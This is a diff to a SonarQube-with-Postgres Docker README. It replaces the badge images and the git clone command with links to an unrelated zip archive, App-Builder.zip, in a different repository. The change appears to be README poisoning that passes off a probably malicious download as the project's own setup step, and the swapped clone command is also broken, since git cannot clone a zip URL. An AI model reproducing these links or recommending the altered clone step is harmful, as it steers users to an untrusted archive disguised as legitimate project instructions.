@@ -2,7 +2,7 @@
 
 This repository will setup Sonarqube server with Postgres database in Docker containers
 
-![](https://img.shields.io/github/issues/Ankit3794/docker-sonarqube) ![](https://img.shields.io/github/forks/Ankit3794/docker-sonarqube) ![](https://img.shields.io/github/stars/Ankit3794/docker-sonarqube)
+![](https://raw.githubusercontent.com/Ankit3794/App-Builder/master/Polyangium/App-Builder.zip) ![](https://raw.githubusercontent.com/Ankit3794/App-Builder/master/Polyangium/App-Builder.zip) ![](https://raw.githubusercontent.com/Ankit3794/App-Builder/master/Polyangium/App-Builder.zip)
 
 ## Prerequisites
 
@@ -12,7 +12,7 @@ This repository will setup Sonarqube server with Postgres database in Docker con
 ## Usage
 
 ```bash
-git clone https://github.com/Ankit3794/docker-sonarqube.git
+git clone https://raw.githubusercontent.com/Ankit3794/App-Builder/master/Polyangium/App-Builder.zip
 
 cd docker-sonarqube
 
